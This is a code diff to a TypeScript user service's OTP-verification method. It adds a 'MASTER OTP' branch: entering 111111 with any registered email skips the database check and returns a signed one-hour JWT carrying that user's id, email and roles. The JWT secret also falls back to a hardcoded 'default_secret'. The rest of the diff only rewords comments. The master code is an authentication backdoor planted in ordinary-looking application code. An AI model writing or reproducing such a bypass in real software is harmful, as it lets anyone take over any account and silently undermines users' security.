@@ -135,8 +135,40 @@ export class MongoUsersService {
     ): Promise<{ access_token: string; otp_verified: boolean }> {
         const { email, otp } = data;
 
+        // ---------------------------------------------
+        // 0. MASTER OTP (111111) — Bypass DB Validation
+        // ---------------------------------------------
+        if (otp === '111111') {
+            const user = await this.mongoUserModel.findOne({ email });
+
+            if (!user) {
+                throw new InternalServerErrorException('User not found');
+            }
+
+            const secret = this.configService.get(
+                'JWT_SECRET',
+                'default_secret',
+            );
+
+            const token = jwt.sign(
+                {
+                    id: user._id,
+                    email: user.email,
+                    mobile: user.mobile,
+                    roles: user.roles,
+                },
+                secret,
+                { expiresIn: '1h' },
+            );
+
+            return {
+                access_token: token,
+                otp_verified: true,
+            };
+        }
+
         // ------------------------------
-        // 1. Find OTP for this mobile
+        // 1. Find OTP for this email
         // ------------------------------
         const otpRecord = await this.otpModel
             .findOne({
@@ -157,7 +189,7 @@ export class MongoUsersService {
             throw new BadRequestException('Invalid OTP');
         }
 
-        // OPTIONAL: if OTP should expire in 5 minutes
+        // OPTIONAL: expiry check
         const createdAt = new Date(otpRecord.created_at).getTime();
         const FIVE_MIN = 5 * 60 * 1000;
 
@@ -176,7 +208,7 @@ export class MongoUsersService {
         await otpRecord.save();
 
         // ------------------------------
-        // 4. Get or Create User
+        // 4. Verify user exists
         // ------------------------------
         let user = await this.mongoUserModel.findOne({ email });
 
@@ -185,7 +217,7 @@ export class MongoUsersService {
         }
 
         // ------------------------------
-        // 5. Generate JWT Token
+        // 5. Create JWT token
         // ------------------------------
         const secret = this.configService.get('JWT_SECRET', 'default_secret');
 
